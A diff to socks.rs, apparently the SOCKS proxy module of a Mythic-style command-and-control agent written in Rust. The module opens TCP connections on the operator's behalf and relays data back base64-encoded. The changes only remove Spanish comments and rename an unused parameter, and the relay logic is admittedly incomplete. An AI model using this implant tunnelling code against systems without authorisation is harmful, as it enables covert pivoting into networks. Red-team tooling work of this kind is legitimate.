@@ -1,3 +1,4 @@
+// socks.rs
 use crate::agent::AgentTask;
 use crate::mythic_continued;
 use base64::{decode, encode};
@@ -18,7 +19,6 @@ pub struct SocksMsg {
 
 #[derive(Debug)]
 pub struct SocksState {
-    // Usa TcpStream completo en lugar de mitades para evitar problemas de lifetime
     pub connections: Arc<Mutex<HashMap<u32, std::net::SocketAddr>>>,
     pub outbound: Arc<Mutex<Vec<SocksMsg>>>,
 }
@@ -66,19 +66,14 @@ async fn process_messages(tx: &mpsc::Sender<serde_json::Value>, msgs: Vec<SocksM
 
         let data = decode(&msg.data).unwrap_or_default();
 
-        // Verificar si ya tenemos una conexión para este server_id
         if conns.contains_key(&msg.server_id) {
-            // En una implementación real, aquí enviaríamos datos a una conexión existente
-            // Por ahora, simplemente ignoramos ya que no tenemos los streams guardados
             continue;
         } else {
             let addr = parse_socks_address(&data);
             if let Some(addr) = addr {
                 if let Ok(stream) = TcpStream::connect(addr).await {
-                    // Guardar información de la conexión
                     conns.insert(msg.server_id, addr);
                     
-                    // Crear una task para manejar esta conexión
                     let tx_clone = tx.clone();
                     let state_clone = state.clone();
                     let server_id = msg.server_id;
@@ -107,18 +102,17 @@ async fn handle_socks_connection(
     server_id: u32,
     mut stream: TcpStream,
     initial_data: Vec<u8>,
-    tx: mpsc::Sender<serde_json::Value>,
+    // CORRECCIÓN: Prefija con _ para indicar que está intencionalmente sin usar
+    _tx: mpsc::Sender<serde_json::Value>,
     state: Arc<SocksState>,
 ) {
-    // Escribir datos iniciales
     let _ = stream.write_all(&initial_data).await;
     
     let mut buf = [0u8; 4096];
     
-    // Bucle de lectura
     loop {
         match stream.read(&mut buf).await {
-            Ok(0) => break, // Conexión cerrada
+            Ok(0) => break,
             Ok(n) => {
                 let data = encode(&buf[..n]);
                 let msg = SocksMsg { exit: false, server_id, data };
@@ -128,14 +122,12 @@ async fn handle_socks_connection(
         }
     }
     
-    // Notificar cierre de conexión
     state.outbound.lock().unwrap().push(SocksMsg { 
         exit: true, 
         server_id, 
         data: String::new() 
     });
     
-    // Remover del estado
     state.connections.lock().unwrap().remove(&server_id);
 }
 
